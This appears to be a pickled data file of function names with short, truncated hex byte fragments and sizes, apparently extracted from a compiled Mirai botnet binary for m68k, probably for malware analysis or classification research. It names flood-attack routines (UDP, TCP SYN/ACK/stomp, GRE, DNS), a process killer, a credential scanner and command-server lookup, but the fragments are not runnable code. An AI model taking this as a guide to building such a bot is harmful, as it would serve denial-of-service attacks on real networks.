(lp0
(S'_init'
p1
S'4e560061ff0061ff00045e4e'
p2
L20L
tp3
a(S'__do_global_dtors_aux'
p4
S'4e56004a39220130514a885889c98030220130514a8841f900004a88487900149058'
p5
L78L
tp6
a(S'call___do_global_dtors_aux'
p7
S'4e56004e5e4e'
p8
L8L
tp9
a(S'frame_dummy'
p10
S'4e560041f900004a884879018e80149050'
p11
L62L
tp12
a(S'call_frame_dummy'
p13
S'4e56004e5e4e'
p14
L8L
tp15
a(S'_start'
p16
S'9dce2020574851487900d64879009448502f0080524eb9'
p17
L38L
tp18
a(S'attack_app_http'
p19
S'4fefaea02c519424519c1f6f51930083519b42a748781545f9805c4e922f480079001800020308009748780802032c487900f14878162f02032a4fef00bc487818020380'
p20
L7408L
tp21
a(S'attack_get_opt_str'
p22
S'48e7006f002f002f0042'
p23
L68L
tp24
a(S'attack_start'
p25
S'4e560048e720001800160045f9804e9272b200886e00'
p26
L180L
tp27
a(S'attack_parse'
p28
S'4fefff48e76f002f0003b800'
p29
L472L
tp30
a(S'attack_kill_all'
p31
S'2080ac003cb92080b0000cb92080b400dc80b43900ac42b92080bc80bc07c0b92080c442b92080c8601e48780900007e508f80c43900d2002f00007e50'
p32
L370L
tp33
a(S'attack_get_opt_ip'
p34
S'48e7006f002f002f004283004a83001800428122280488112f00008b04df1c'
p35
L82L
tp36
a(S'attack_get_opt_int'
p37
S'48e7006f002f002f004283004a830018004281222804881148780a0000752850'
p38
L86L
tp39
a(S'attack_init'
p40
S'48e7380048780180584e9424422804bc428080a6e5206880a8f980a080a83980211380a6487806487801241100bc428080a6e5206880a8932380a83980211380a64fef00bc487801241100bc428080a6e5206880a8932380a83980211380a6487806487801241100bc428080a6e5206880a8932380a83980211380a64fef00bc487801241100bc428080a6e5206880a8932380a83980211380a6487806487801241100bc428080a6e5206880a8932380a83980211380a64fef00bc487801241100bc428080a6e5206880a8932380a83980211380a6487806487801241100bc428080a6e5206880a8932380a83980211380a64fef00bc487801241100bc428080a6e5206880a8932380a83980211380a6487806487801241100bc428080a6e5206880a8932380a83980211380a64fef00704cdf4e'
p41
L810L
tp42
a(S'attack_gre_eth'
p43
S'4fefff48e72c002f0083007804852f00058f2f4800a7487802020380'
p44
L1548L
tp45
a(S'attack_gre_ip'
p46
S'4fef'
p47
L1312L
tp48
a(S'attack_tcp_stomp'
p49
S'4fef'
p50
L1642L
tp51
a(S'attack_tcp_ack'
p52
S'4fefff6f0042842f0042852f00007e2f480042a74878020204f980'
p53
L1448L
tp54
a(S'attack_tcp_syn'
p55
S'4fefff48e728702f0083007804852f0005782aa7487802020380'
p56
L1364L
tp57
a(S'attack_udp_plain'
p58
S'4fef'
p59
L720L
tp60
a(S'attack_udp_generic'
p61
S'4fefff48e72c002f0083007804852f0005b64e962f480042a7487802020380'
p62
L1182L
tp63
a(S'attack_udp_vse'
p64
S'4e56ff48e73c6e0000830048780485002f056b4842a7487802020380'
p65
L940L
tp66
a(S'attack_udp_dns'
p67
S'4feff72f082f08087804842f0804ff002f4800a7487802020380'
p68
L1530L
tp69
a(S'checksum_generic'
p70
S'2f026f00220001'
p71
L84L
tp72
a(S'checksum_tcpudp'
p73
S'48e7006f002f003a002018002910b06c00a44283188001010280'
p74
L224L
tp75
a(S'killer_kill'
p76
S'48780939ff0050'
p77
L20L
tp78
a(S'killer_kill_by_port'
p79
S'4e56dd48e73c0049eeeddf1042a72f0cf9805c4e920e0687'
p80
L1340L
tp81
a(S'killer_init'
p82
S'4e56dfe73ca761ff002861ff00238058'
p83
L1892L
tp84
a(S'anti_gdb_entry'
p85
S'2380d0'
p86
L12L
tp87
a(S'ensure_single_instance'
p88
S'4e56'
p89
L454L
tp90
a(S'resolve_cnc_addr'
p91
S'48e7487803806e4e9642a748780380e0952f08000c48487803800a4fef008b240061ff00c813011c806c2f0b000c4878049642a74878049533806a7804944fef00df'
p92
L130L
tp93
a(S'main'
p94
S'4e56f9d83f3c6e0015de06'
p95
L2440L
tp96
a(S'rand_next'
p97
S'2f03023901a88080d680d2f980da39c176e6b5b1e0b32380de1f4e'
p98
L76L
tp99
a(S'rand_init'
p100
S'2f0261ff002380d2003061ff0094b12380d661ff00e2c080d6b12380de244e'
p101
L70L
tp102
a(S'rand_alphastr'
p103
S'4fef'
p104
L308L
tp105
a(S'rand_str'
p106
S'48e720006f004a8800de397901d62480d2b06c22100ba974e4b7b3e0b12459886f322201b06dd2b038023c0ba974e4b7b3e0b13455882380dec380dac4c980d22072e3b52380d2c4c380da03a9e0b72380de4cdf4e'
p107
L210L
tp108
a(S'resolv_entries_free'
p109
S'2f0b0a008a200047f9807e062f0058'
p110
L42L
tp111
a(S'resolv_lookup'
p112
S'4fefef6048e724104878064878010045a62c4bef0849ed000a8084464e9041ed0042020080120000b40101528a4a80100c464e9245f40842af10af100c464e937edefcb8048001e02048404240908147ef1000b27c02c00808103f7c353b003b00bc0000767a4fef0072b20a03002c588f4878020061ff009a70b000f84878100b03003d0cffde4000072f0d00a272b200c22f030045f9808c00000003009241ef10ef004298b7fa24ea01a8b720302f401042af10486f1042a742a7486f10434868002f7eef00ff80372d0042a742a748780008486f0003003d0c464e9072d0b063055285'
p113
L956L
tp114
a(S'scanner_kill'
p115
S'48780939ff0074'
p116
L20L
tp117
a(S'setup_connection'
p118
S'4fefff48e7386f0049ef009442af0042af00af002000ff0000294878010061ff00274000ef00ffab004878000061ff0042a74878032b04f9808c000000002b04923f7c022c6b003f6b002779011408274000ef00bc2f0c2b04ff00064fef00df4fef004e'
p119
L200L
tp120
a(S'add_auth_entry'
p121
S'48e72f002c002f002080e2008980002f39ff002423800e2c80e2038084282452'
p122
L334L
tp123
a(S'scanner_init'
p124
S'4e56f8d4e73cff00d8c01872b20061ff0023805c61'
p125
L6238L
tp126
a(S'table_retrieve_val'
p127
S'22006f0020e7d2d1808808300080204e'
p128
L42L
tp129
a(S'table_lock_val'
p130
S'48e700100022e7d0d38088396900008c0048432472e2420141d1bbd1d1d1800080df3c'
p131
L100L
tp132
a(S'table_unlock_val'
p133
S'48e700100022e7d0d38088396900008c0048432472e2420141d1bbd1d1d1800080df3c'
p134
L100L
tp135
a(S'table_init'
p136
S'48e7300047f980ae4e932448781e487900e880e09223809a084e932448780280fa2f082380a080a44fef00bc4e932448781d'
p137
L1970L
tp138
a(S'util_strlen'
p139
S'200410428030004e75'
p140
L24L
tp141
a(S'util_strcpy'
p142
S'2f022f00200c104280300074b42041221253811041428174b4e41f4e'
p143
L66L
tp144
a(S'util_memcpy'
p145
S'22046f0022000e428008085280'
p146
L30L
tp147
a(S'util_zero'
p148
S'20042f000c8000b2'
p149
L24L
tp150
a(S'util_memsearch'
p151
S'48e7306f0022006f00221c89ff4a811408b488128008b488ee5288804e'
p152
L78L
tp153
a(S'util_atoi'
p154
S'48e7306f002f00101449c249c30c00'
p155
L290L
tp156
a(S'util_fdgets'
p157
S'48e730002a002f002442830078010204934fef0001830c00dc56c080204cdf4e'
p158
L80L
tp159
a(S'util_local_addr'
p160
S'4e56'
p161
L134L
tp162
a(S'util_stristr'
p163
S'48e7202f0024004a1242844a32f8201c454283321238100600bf620260100600bf620160b40e428388306018b6ee20c542846f00454283083c'
p164
L126L
tp165
a(S'util_strcmp'
p166
S'22046f004a114281f84a1042803000b00e4280118951c84053804e7581b0d8'
p167
L82L
tp168
a(S'util_strncmp'
p169
S'2f026f00200c2f004a114281f84a1042803000b26d280e6d2053'
p170
L104L
tp171
a(S'util_itoa'
p172
S'4fef'
p173
L240L
tp174
a(S'fcntl'
p175
S'4e56ff2f0302002dff2058802d0cae0010b20008b0001c'
p176
L188L
tp177
a(S'__syscall_fcntl64'
p178
S'4e56'
p179
L88L
tp180
a(S'fcntl64'
p181
S'4e56'
p182
L54L
tp183
a(S'__syscall_chdir'
p184
S'4e56'
p185
L62L
tp186
a(S'chdir'
p187
S'4e56002f0061b84e'
p188
L16L
tp189
a(S'close'
p190
S'4e56'
p191
L60L
tp192
a(S'fork'
p193
S'4e56'
p194
L56L
tp195
a(S'getpid'
p196
S'4e56'
p197
L56L
tp198
a(S'getppid'
p199
S'4e56'
p200
L56L
tp201
a(S'ioctl'
p202
S'4e56ff48e700002dff2058802d00fc2d6e'
p203
L130L
tp204
a(S'__syscall_kill'
p205
S'4e56'
p206
L72L
tp207
a(S'kill'
p208
S'4e56002f000061aa50'
p209
L20L
tp210
a(S'__syscall_open'
p211
S'4e56ff48e700003d6e004284ff200c0408094e402d'
p212
L94L
tp213
a(S'open'
p214
S'4e56'
p215
L80L
tp216
a(S'creat'
p217
S'4e56002f0078412f0061'
p218
L30L
tp219
a(S'prctl'
p220
S'4e56'
p221
L98L
tp222
a(S'read'
p223
S'4e56'
p224
L84L
tp225
a(S'readlink'
p226
S'4e56'
p227
L84L
tp228
a(S'select'
p229
S'4e56'
p230
L100L
tp231
a(S'setsid'
p232
S'4e56'
p233
L56L
tp234
a(S'sigprocmask'
p235
S'4e56ff48e730001c0072b21200047020ff6068'
p236
L160L
tp237
a(S'time'
p238
S'4e56'
p239
L62L
tp240
a(S'unlink'
p241
S'4e56'
p242
L62L
tp243
a(S'write'
p244
S'4e56'
p245
L84L
tp246
a(S'closedir'
p247
S'4e56'
p248
L198L
tp249
a(S'opendir'
p250
S'4e56ff0061'
p251
L350L
tp252
a(S'readdir'
p253
S'4e56ff4aae001200017020600000d0802f0001'
p254
L292L
tp255
a(S'__errno_location'
p256
S'4e560020014c205e4e'
p257
L16L
tp258
a(S'clock'
p259
S'4e56'
p260
L76L
tp261
a(S'_wordcopy_bwd_aligned'
p262
S'4e56ff42ae'
p263
L638L
tp264
a(S'_wordcopy_bwd_dest_aligned'
p265
S'4e56ff2f02'
p266
L578L
tp267
a(S'memmove'
p268
S'4e56'
p269
L288L
tp270
a(S'memset'
p271
S'4e56ff2df470b000001400000080002d'
p272
L310L
tp273
a(S'inet_addr'
p274
S'4e56'
p275
L48L
tp276
a(S'accept'
p277
S'4e56ff20002d00002deeff2f08001850'
p278
L50L
tp279
a(S'bind'
p280
S'4e56ff20002d006e00'
p281
L48L
tp282
a(S'connect'
p283
S'4e56ff20002d006e00'
p284
L48L
tp285
a(S'getsockname'
p286
S'4e56ff20002d00002deeff2f080061ff002c'
p287
L50L
tp288
a(S'getsockopt'
p289
S'4e56'
p290
L66L
tp291
a(S'listen'
p292
S'4e56'
p293
L42L
tp294
a(S'recv'
p295
S'4e56ff20002d006e00'
p296
L56L
tp297
a(S'recvfrom'
p298
S'4e56'
p299
L72L
tp300
a(S'send'
p301
S'4e56ff20002d006e00'
p302
L56L
tp303
a(S'sendto'
p304
S'4e56'
p305
L70L
tp306
a(S'setsockopt'
p307
S'4e56'
p308
L64L
tp309
a(S'socket'
p310
S'4e56ff20002d00002deeff2f080061ff004850'
p311
L50L
tp312
a(S'raise'
p313
S'4e560061'
p314
L28L
tp315
a(S'sigaddset'
p316
S'4e56'
p317
L70L
tp318
a(S'sigemptyset'
p319
S'4e56'
p320
L60L
tp321
a(S'signal'
p322
S'4e56'
p323
L238L
tp324
a(S'__sigismember'
p325
S'4e56ff20008080a840'
p326
L80L
tp327
a(S'__sigaddset'
p328
S'4e56'
p329
L68L
tp330
a(S'__sigdelset'
p331
S'4e56'
p332
L72L
tp333
a(S'__malloc_from_heap'
p334
S'4e56'
p335
L466L
tp336
a(S'malloc'
p337
S'4e56'
p338
L168L
tp339
a(S'calloc'
p340
S'4e56ff200008002dae0022'
p341
L118L
tp342
a(S'__heap_delete'
p343
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p344
L88L
tp345
a(S'__free_to_heap'
p346
S'4e56'
p347
L342L
tp348
a(S'free'
p349
S'4e56004879011880482f006100944fef005e4e'
p350
L32L
tp351
a(S'realloc'
p352
S'4e56'
p353
L408L
tp354
a(S'__heap_delete_0'
p355
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p356
L88L
tp357
a(S'__heap_free_area_alloc'
p358
S'4e56'
p359
L66L
tp360
a(S'__heap_alloc'
p361
S'4e56ff2f026e00ae'
p362
L150L
tp363
a(S'__heap_delete_1'
p364
S'4e5600200c2804806e00680028084000200c280816200c6800280440000e200c28046e0020'
p365
L88L
tp366
a(S'__heap_free_area_alloc_0'
p367
S'4e56'
p368
L66L
tp369
a(S'__heap_alloc_at'
p370
S'4e56ff2f02'
p371
L144L
tp372
a(S'__heap_link_free_area'
p373
S'4e5600200c6e00046e006e00004aae000c6e00210c04086e0020000a6e006e00084e'
p374
L70L
tp375
a(S'__heap_link_free_area_after'
p376
S'4e56004aae000c6e00210c04086e0020006e00004e5e4e'
p377
L44L
tp378
a(S'__heap_add_free_area'
p379
S'4e56'
p380
L66L
tp381
a(S'__heap_free'
p382
S'4e56'
p383
L404L
tp384
a(S'atol'
p385
S'4e560048780a2f0061ff000cef005e4e'
p386
L28L
tp387
a(S'strtol'
p388
S'4e5600487801002f000061ff000e4fef004e5e4e'
p389
L34L
tp390
a(S'_stdlib_strto_l'
p391
S'4e56'
p392
L562L
tp393
a(S'exit'
p394
S'4e56ff2000487901502f00ff2f0800034fef0079015061ff00ec58'
p395
L122L
tp396
a(S'sleep'
p397
S'4e56fe20002daeff4aae0008fe0220eeff48ff600c'
p398
L558L
tp399
a(S'__uClibc_fini'
p400
S'4e56'
p401
L106L
tp402
a(S'__pthread_return_0'
p403
S'4e56004280'
p404
L10L
tp405
a(S'_pthread_cleanup_push_defer'
p406
S'4e56004e5e4e'
p407
L8L
tp408
a(S'__check_suid'
p409
S'4e56'
p410
L92L
tp411
a(S'__check_one_fd'
p412
S'4e56'
p413
L68L
tp414
a(S'__uClibc_init'
p415
S'4e56002080484a8039808048230010803c3c00000661'
p416
L74L
tp417
a(S'__uClibc_main'
p418
S'4e56ff23008034ee0001442000102380386e00222080380010c000a7200680ff00'
p419
L582L
tp420
a(S'__socketcall'
p421
S'4e56'
p422
L74L
tp423
a(S'__syscall_exit'
p424
S'4e56'
p425
L56L
tp426
a(S'_exit'
p427
S'4e56002f0061be'
p428
L14L
tp429
a(S'__syscall_fstat'
p430
S'4e56'
p431
L74L
tp432
a(S'fstat'
p433
S'4e56'
p434
L54L
tp435
a(S'__getdents'
p436
S'4e56ff2f002f000061ff005e4fef00ae'
p437
L278L
tp438
a(S'__syscall_getdents64'
p439
S'4e56'
p440
L88L
tp441
a(S'__getdents64'
p442
S'4e56ff2f02'
p443
L548L
tp444
a(S'getegid'
p445
S'4e56'
p446
L60L
tp447
a(S'geteuid'
p448
S'4e56'
p449
L60L
tp450
a(S'getgid'
p451
S'4e56'
p452
L60L
tp453
a(S'getuid'
p454
S'4e56'
p455
L60L
tp456
a(S'__syscall_llseek'
p457
S'4e56'
p458
L98L
tp459
a(S'lseek64'
p460
S'4e56'
p461
L108L
tp462
a(S'nanosleep'
p463
S'4e56'
p464
L78L
tp465
a(S'sbrk'
p466
S'4e56'
p467
L106L
tp468
a(S'times'
p469
S'4e56'
p470
L62L
tp471
a(S'__xstat64_conv'
p472
S'4e56'
p473
L336L
tp474
a(S'__xstat_conv'
p475
S'4e56ff48785442a72f00'
p476
L316L
tp477
a(S'_wordcopy_fwd_aligned'
p478
S'4e56ff70c0f470b0ff0038ffd0d130084efb00000110386000200c50'
p479
L566L
tp480
a(S'_wordcopy_fwd_dest_aligned'
p481
S'4e56ff2f02000381f820'
p482
L500L
tp483
a(S'memcpy'
p484
S'4e56'
p485
L240L
tp486
a(S'inet_aton'
p487
S'4e56'
p488
L362L
tp489
a(S'sigaction'
p490
S'4e56'
p491
L232L
tp492
a(S'_dl_aux_init'
p493
S'4e560030d1002000c000d1002000c04e'
p494
L44L
tp495
a(S'brk'
p496
S'4e56'
p497
L64L
tp498
a(S'__syscall_rt_sigaction'
p499
S'4e56'
p500
L94L
tp501
a(S'ntohl'
p502
S'4e560020004e5e4e'
p503
L12L
tp504
a(S'ntohs'
p505
S'4e56'
p506
L22L
tp507
a(S'htonl'
p508
S'4e560020004e5e4e'
p509
L12L
tp510
a(S'htons'
p511
S'4e56'
p512
L22L
tp513
a(S'__do_global_ctors_aux'
p514
S'4e56002f0a8018790118b00a20ff6e'
p515
L42L
tp516
a(S'call___do_global_ctors_aux'
p517
S'4e56004e5e4e'
p518
L8L
tp519
a(S'_fini'
p520
S'4e560061'
p521
L14L
tp522
a.